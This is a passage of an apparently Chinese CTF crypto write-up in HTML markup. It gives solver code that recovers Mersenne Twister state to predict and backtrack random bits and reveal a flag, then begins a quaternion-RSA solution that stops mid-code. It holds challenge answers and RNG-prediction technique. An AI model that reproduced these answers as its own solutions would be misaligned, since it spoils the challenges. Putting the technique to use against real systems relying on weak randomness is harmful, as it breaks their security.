punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">)</span>\ns<span class=\"token operator\">=</span>M<span class=\"token punctuation\">.</span>solve_left<span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span>\n\n\nG<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">624</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    C<span class=\"token operator\">=</span><span class=\"token number\">0</span>\n    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        C<span class=\"token operator\">&lt;&lt;</span><span class=\"token operator\">=</span><span class=\"token number\">1</span>\n        C<span class=\"token operator\">|</span><span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token operator\">*</span>i<span class=\"token operator\">+</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    G<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>C<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">import</span> random\nRNG1 <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>Random<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">624</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    G<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>G<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>G<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token comment\"># G=[0, 490535307, 1496475985, 1304389653, 3073248862, 2386441930, 1822503478, 2020774719, 4023824107, 1480116190, 3595911337, 4199707216, 669968687, 826798707, 2615625545, 3915683430, 168325080, 829537011, 1165965885, 981460179, 2661311210, 316250339, 1045607037, 2688190930, 118171210, 3451453216, 3866477339, 2868202172, 1761379194, 1058828879, 1542168919, 2021772452, 2569206428, 2418006454, 3114112729, 1682301179, 3200486818, 599215990, 3404606484, 1911329240, 3444584517, 2269914870, 2733846467, 2801800027, 248142392, 1885498765, 860592907, 1802543044, 2381250266, 858114164, 2518994312, 962044368, 973015259, 3942118714, 3680009016, 2032313670, 3387751989, 1054484707, 2636564424, 1944206009, 2577425725, 1603497474, 392224733, 1859494210, 3997782846, 4192576547, 1107246885, 2404750701, 2157620568, 270457783, 2445196691, 3937008468, 3121127879, 2378519387, 425217735, 2564663584, 686095178, 2624185419, 3971886279, 2680818161, 2787863330, 2110546597, 687271821, 2277728162, 2803200905, 1049854254, 167450062, 3024645977, 3863615534, 423262694, 2034761849, 969338715, 1511630961, 2649226142, 366301301, 2130366793, 1560835738, 3571705620, 3487936619, 839414948, 1316270660, 568821823, 763054927, 2908961603, 1102984025, 3749009029, 449320085, 1308343884, 4157952695, 3187534659, 1580220597, 2173463099, 1595396219, 560342012, 3540854382, 370188528, 2936067839, 3845682323, 2060758533, 2636537833, 2045197349, 1945678739, 1987702201, 1386018091, 3389849161, 3658584265, 1063584606, 1609671890, 2147966037, 408763514, 173407274, 3026893195, 782093047, 612664728, 2008637303, 2231388523, 376518271, 2459748419, 2989539508, 1291508175, 739599924, 2787615130, 438993275, 3419636363, 396288162, 890864194, 2703944810, 2855282142, 3822277049, 2097517145, 3561662446, 3033564783, 1419618886, 1113476278, 1207289994, 51062508, 2200207646, 270434158, 3368286735, 1919259101, 2520477581, 3490526248, 575225377, 3390786656, 685824799, 2700369515, 1002309859, 71116734, 2055482703, 2658054435, 1094192336, 1947555707, 2442909426, 3499290994, 4054825654, 4162150808, 595324989, 2564147367, 2210623235, 3240656068, 2974526728, 1097736460, 3789121430, 990080517, 455497279, 591810412, 2723818619, 1828779877, 3360239376, 3698746341, 1962766646, 3891940910, 194869848, 3113141597, 4173680019, 2492879487, 1782458264, 2644873038, 3057000015, 1477560683, 260635038, 4014541913, 2475381256, 3432141583, 1449600258, 1806521550, 3993006180, 1144296388, 291996587, 2791231577, 2014376521, 3385338386, 3917594173, 4112262622, 3881010559, 1879348257, 4088686127, 943465051, 2717992292, 281219314, 829214474, 1429253889, 896560967, 4022504673, 1679700533, 4084224237, 3205942608, 3596088508, 2112079603, 3786503446, 2339855853, 358914192, 1821223774, 3764762766, 574390400, 230757101, 1681353616, 1404353461, 474457722, 818843357, 1916555525, 1478313262, 1376597702, 1725676847, 2410606224, 160362913, 165431882, 679714160, 578803644, 1251384768, 781503133, 252645721, 1216677581, 745854028, 4257762445, 232057782, 4131450922, 2243258111, 2680095923, 2131010707, 1945987666, 3649103696, 1306908197, 3923095658, 1586814958, 4275479481, 1792900040, 3513683706, 3043365645, 1598493028, 32483759, 212292997, 2484980536, 833036523, 446172640, 469599570, 1783543378, 34817764, 381132111, 1816020014, 3267362667, 223013760, 3717861858, 1981643591, 3438213528, 1159293740, 1087473027, 1845306386, 1597047436, 811182716, 4036992807, 866266593, 2817126195, 2583634769, 4227649879, 2672651673, 1158298570, 1147396726, 2938397432, 1542609148, 4196176929, 4064670511, 2395573335, 529637852, 4218916776, 2144528354, 1480788832, 1397451235, 1376724653, 2972863103, 3126088025, 1754053571, 61572923, 1962366418, 3209345005, 1135973797, 2282020151, 1617329326, 2165555451, 1335819294, 4274157719, 26224158, 836546160, 1863920790, 3735102502, 226852542, 621648448, 2125683057, 2719749744, 2624596686, 1627646676, 1476402803, 1157882819, 2139666545, 4224008503, 538777205, 160235477, 1389743733, 4255663843, 1232932267, 714165924, 3360017571, 3861531699, 1259644568, 1889531702, 3835320074, 962334880, 2655642856, 2626363498, 1891384806, 1801620109, 1897599626, 3687809766, 1522030816, 1513382903, 3712790758, 3610944389, 2016393056, 1006803814, 517272163, 2093521873, 3521116957, 365700165, 127017649, 1034144380, 383768854, 814208276, 794839368, 2538604191, 1941513101, 1342716317, 3555862634, 856481495, 2490707626, 3583375428, 2805836257, 245564123, 3108295323, 1565518856, 2649180690, 3332256362, 332138267, 2753126792, 1373150168, 3689890710, 223149061, 2451398005, 2044764250, 253027501, 3654914798, 3071035850, 4073951612, 690760932, 2576679227, 1899001759, 3179694571, 549833987, 3103159161, 2749555997, 3701137981, 103780406, 3880550485, 641014351, 614977565, 3252106272, 1500800921, 2346355748, 1437619729, 3713115526, 4169303983, 953535013, 722731441, 3485174363, 1123805551, 596536035, 1466804419, 3185872953, 2541958005, 909181586, 2235810910, 2325856501, 1907373845, 3395068733, 3727013849, 3129841537, 2209755148, 386103378, 959714264, 4059368152, 3171578698, 1935673297, 1334114851, 2000714717, 291544611, 2924507130, 1118846473, 834320931, 290128353, 758935454, 1295926016, 1596770824, 1977132939, 3804148806, 3591309623, 4209845635, 2998785209, 3353138216, 1739365771, 228727322, 2787865152, 4064361337, 3898185832, 628696008, 805010811, 2283970114, 261773773, 373115591, 2811158375, 2209330766, 476245752, 2727559206, 729386039, 3598648760, 227347764, 2772461981, 3927693335, 772797350, 1215579938, 1991587620, 1968980116, 213188572, 1455236565, 646373577, 3221190285, 2407608088, 388710597, 3068317471, 560173616, 2384843322, 2804823319, 3296469232, 4132838759, 1166039793, 1651089967, 1217559362, 1466724612, 3066497469, 2542065239, 1548132571, 2252598557, 1114227092, 315950281, 4260294426, 390016269, 237846157, 666128591, 4104218965, 4052610947, 2880940708, 679949465, 3265033554, 2618804058, 1983265063, 3934746131, 3851626972, 2695590210, 277341758, 2496522831, 2390301598, 1237676785, 541056536, 559487185, 878088736, 1654760693, 3091440937, 4184991854, 4277345620, 4128668672, 3475002233, 1191304304, 410233597, 1753481581, 522497440, 3490095733, 1740782454, 279075776, 4111542987, 1488482616, 2358022381, 2420694338, 4051823347, 2839869382, 700753851, 4187502580, 3609799609, 3816223830, 3465776160, 2643572446, 2117522904, 337820788, 4095876916, 4027724494, 3030168724, 2966453700, 750155676, 2187990790, 1012578929, 1502179669, 1028354250, 3886098849, 422175433, 1312545625, 3002465781, 1095759919, 364274776, 608451515, 539138648, 3725177121, 2681745835, 2060057886, 2467932655, 1328800475, 3777619753, 871763400, 3312924583, 2674204807, 4159118820, 3502457342, 3533526784, 2392773867, 3758459535, 313416918, 2746154645, 2040485405, 3212871698, 3744071701, 1518338816, 2076259952, 2344700130, 3755882401, 1001438918, 2331345786, 573931854, 371837673, 2890869138, 773771187, 2205676903, 1136370498, 1687795223, 3691084510, 2583108857, 1618641671, 1809021081, 3933440855, 2749174598, 530562158, 2653872255, 2070076429, 467552727, 577607036, 459715927, 1232385236, 495255405, 225866996, 3871108981, 565101302, 373456503, 1504979081, 761278333, 2227115284, 3700809837, 3597612966, 517375768, 108496019, 2916932837, 2100375706, 746007798, 216873417, 3182230215, 3523337342, 365334474, 612842567, 532858878, 3162228125]</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">624</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    G<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>G<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    \n\n<span class=\"token keyword\">import</span> random\nRNG1 <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>Random<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nRNG1<span class=\"token punctuation\">.</span>setstate<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">tuple</span><span class=\"token punctuation\">(</span>G<span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token number\">624</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">from</span> extend_mt19937_predictor <span class=\"token keyword\">import</span> ExtendMT19937Predictor\n\npredictor <span class=\"token operator\">=</span> ExtendMT19937Predictor<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">624</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    predictor<span class=\"token punctuation\">.</span>setrandbits<span class=\"token punctuation\">(</span>RNG1<span class=\"token punctuation\">.</span>getrandbits<span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">624</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    predictor<span class=\"token punctuation\">.</span>backtrack_getrandbits<span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span>\n    \nkey<span class=\"token operator\">=</span>predictor<span class=\"token punctuation\">.</span>backtrack_getrandbits<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>bit_length<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>e<span class=\"token operator\">^</span><span class=\"token operator\">^</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre>\n\n<p><em><strong>0h_51mple_r@nd0m</strong></em></p>\n<h3 id=\"复复复复数\"><a href=\"#复复复复数\" class=\"headerlink\" title=\"复复复复数\"></a>复复复复数</h3><p>四元数的逆元为其共轭数除以模长的平方，根据已知可以求得p，q，r</p>\n<p>但是e有个因子3，但是m其实十分小，计算阶然后除以公因数即可直接解出</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">ComComplex</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> value<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>value <span class=\"token operator\">=</span> value\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__str__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        s <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">for</span> k<span class=\"token punctuation\">,</span>i <span class=\"token keyword\">in</span> <span class=\"token builtin\">enumerate</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span> i <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n                s <span class=\"token operator\">+=</span> <span class=\"token string\">'+'</span>\n            s <span class=\"token operator\">+=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token string\">'ijk'</span><span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span>\n        <span class=\"token keyword\">return</span> s\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__add__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> ComComplex<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>i<span class=\"token operator\">+</span>j <span class=\"token keyword\">for</span> i<span class=\"token punctuation\">,</span>j <span class=\"token keyword\">in</span> <span class=\"token builtin\">zip</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">,</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__mul__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        a <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span>self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span>self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span>self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span>\n        b <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span>self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span>\n        c <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span>self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n        d <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-</span>self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>x<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n        <span class=\"token keyword\">return</span> ComComplex<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__mod__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> ComComplex<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>i <span class=\"token operator\">%</span> x <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__pow__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">,</span> n<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        tmp <span class=\"token operator\">=</span> ComComplex<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span>\n        a <span class=\"token operator\">=</span> ComComplex<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">while</span> x<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span> x <span class=\"token operator\">&amp;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n                a <span class=\"token operator\">*=</span> tmp\n            tmp <span class=\"token operator\">*=</span> tmp\n            <span class=\"token keyword\">if</span> n<span class=\"token punctuation\">:</span>\n                a <span class=\"token operator\">%=</span> n\n                tmp <span class=\"token operator\">%=</span> n\n            x <span class=\"token operator\">>></span><span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n        <span class=\"token keyword\">return</span> a\n        \n    <span class=\"token keyword\">def</span> <span class=\"token function\">inv</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">,</span>mod<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        inv_len<span class=\"token operator\">=</span>inverse<span class=\"token punctuation\">(</span><span class=\"token builtin\">sum</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">**</span><span class=\"token number\">2</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>mod<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> ComComplex<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>l<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>inv_len<span class=\"token operator\">%</span>mod<span class=\"token punctuation\">,</span><span class=\"token operator\">-</span>l<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>inv_len<span class=\"token operator\">%</span>mod<span class=\"token punctuation\">,</span><span class=\"token operator\">-</span>l<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>inv_len<span class=\"token operator\">%</span>mod<span class=\"token punctuation\">,</span><span class=\"token operator\">-</span>l<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>inv_len<span class=\"token operator\">%</span>mod<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\nhints <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">375413371936</span><span class=\"token punctuation\">,</span><span class=\"token number\">452903063925</span><span class=\"token punctuation\">,</span><span class=\"token number\">418564633198</span><span class=\"token punctuation\">,</span><span class=\"token number\">452841062207</span><span class=\"token punctuation\">]</span>\ngift <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">8123312244520119413231609191866976836916616973013918670932199631084038015924368317077919454611785179950870055560079987034735836668109705445946887481003729</span><span class=\"token punctuation\">,</span><span class=\"token number\">20508867471664499348708768798854433383217801696267611753941328714877299161068885700412171</span><span class=\"token punctuation\">,</span><span class=\"token number\">22802458968832151777449744120185122420871929971817937643641589637402679927558503881707868</span><span class=\"token punctuation\">,</span><span class=\"token number\">40224499597522456323122179021760594618350780974297095023316834212332206526399536884102863</span><span class=\"token punctuation\">]</span>\nP <span class=\"token operator\">=</span> <span class=\"token number\">8123312244520119413231609191866976836916616973013918670932199631182724263362174895104545305364960781233690810077210539091362134310623408173268475389315109</span>\nn <span class=\"token operator\">=</span> <span class=\"token number\">408713495380933615345467409596399184629824932933932227692519320046890365817329617301604051766392980053993030281090124694858194866782889226223493799859404283664530068697313752856923001112586828837146686963124061670340088332769524367</span>\nc <span class=\"token operator\">=</span> ComComplex<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token number\">212391106108596254648968182832931369624606731443797421732310126161911908195602305474921714075911012622738456373731638115041135121458776339519085497285769160263024788009541257401354037620169924991531279387552806754098200127027800103</span><span class=\"token punctuation\">,</span><span class=\"token number\">24398526281840329222660628769015610312084745844610670698920371305353888694519135578269023873988641161449924124665731242993290561874625654977013162008430854786349580090169988458393820787665342793716311005178101342140536536153873825</span><span class=\"token punctuation\">,</span><span class=\"token number\">45426319565874516841189981758358042952736832934179778483602503215353130229731883231784466068253520728052302138781204883495827539943655851877172681021818282251414044916889460602783324944030929987991059211909160860125047647337380125</span><span class=\"token punctuation\">,</span><span class=\"token number\">96704582331728201332157222706704482771142627223521415975953255983058954606417974983056516338287792260492498273014507582247155218239742778886055575426154960475637748339582574453542182586573424942835640846567809581805953259331957385</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\ne<span class=\"token operator\">=</span><span class=\"token number\">65547</span>\n\ninv<span class=\"token operator\">=</span>ComComplex<span class=\"token punctuation\">.</span>inv<span class=\"token punctuation\">(</span>hints<span class=\"token punctuation\">,</span>P<span class=\"token punctuation\">)</span>\ngifts<span class=\"token operator\">=</span>ComComplex<span class=\"token punctuation\">(</span>gift<span class=\"token punctuation\">)</span>\nkeys<span class=\"token operator\">=</span>inv<span class=\"token operator\">*</span>gifts<span class=\"token operator\">%</span>P\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>keys<span class=\"token punctuation\">)</span>\n\n_<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">,</span>r<span class=\"token operator\">=</span>keys<span class=\"token punctuation\">.</span>value\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">*</span>q<span class=\"token operator\">*</span>r<span class=\"token operator\">-</span>n<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>GCD<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>r<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>GCD<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>GCD<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>GCD<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>r<span class=\"token operator\">-</span><span 